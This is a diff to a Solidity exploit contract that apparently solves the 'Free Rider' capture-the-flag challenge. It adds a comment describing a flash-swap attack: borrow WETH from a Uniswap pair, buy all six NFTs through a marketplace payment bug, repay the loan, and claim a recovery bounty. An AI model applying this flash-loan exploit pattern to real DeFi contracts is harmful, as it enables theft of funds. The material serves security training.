@@ -28,7 +28,7 @@ contract AttackFreeRider {
         pair = IUniswapV2Pair(_pair);
         marketplace = IMarketplace(_marketplace);
         weth = IWETH(_weth);
-        nft = IERC721(_nft);
+        nft = IERC721(_nft); 
         recoveryContract = _recoveryContract;
         player = msg.sender;
     }
@@ -56,7 +56,7 @@ contract AttackFreeRider {
         weth.deposit{value: amountToPayBack}();
         // we deposit native ETH and get WETH to pay back to pair contract
         weth.transfer(address(pair), amountToPayBack);
-
+ 
         // 5. Send NFTs to recovery contract so we can get the bounty
         bytes memory data = abi.encode(player);
         for(uint256 i; i < tokens.length; i++){
@@ -72,3 +72,18 @@ contract AttackFreeRider {
     receive() external payable {}
 
 }
+
+/**
+ * Process pf attack
+ * 1) First we flash swap with 15 WETH from uniswap pair contract.
+ * 2) Convert the WETH to native eth.
+ * 3) Buy the NFTs from FreeRiderMarketplace, where there is bug that it takes only 15 eth for all NFTs.
+ * 4) We have 0.5 native eth, with that we convert native eth to WETH with fees.
+ * 5) After that we repay the WETH in that flash swap with fee.
+ * 6) After buying all 6 NFTs with only 15 eth, we sent all the tokens to FreeRiderRecovery we get the Bounty of 
+      45 eth
+ 
+ * NOTE : when we do a swap in uniswap there is a fallback function(uniswapV2Call) is called.
+ * NOTE : After receiving a NFT the onERC721Received fallback is calles, here we have to return the fallback 
+          selector.
+ */
